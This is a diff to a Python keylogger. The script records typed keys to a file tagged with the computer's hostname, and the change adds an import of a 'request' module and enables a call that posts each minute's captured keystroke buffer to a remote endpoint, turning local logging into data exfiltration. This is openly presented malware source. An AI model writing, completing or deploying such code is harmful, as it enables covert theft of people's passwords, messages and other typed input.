@@ -3,7 +3,7 @@ import logging
 import threading
 import time
 import socket
-
+import request
 logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(message)s')
 
 # 获取本机计算机名
@@ -33,8 +33,8 @@ def write_buffer():
             timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
             log_entry = f"{timestamp} - {hostname}: {' '.join(buffer)}"
             logging.info(log_entry)
-            # ret = request.send_post_request(timestamp, hostname, ' '.join(buffer))
-            # logging.info('Requests sending result: ' + str(ret))
+            ret = request.send_post_request(timestamp, hostname, ' '.join(buffer))
+            logging.info('Requests sending result: ' + str(ret))
             buffer = []
     # 再次启动定时器
     threading.Timer(60, write_buffer).start()
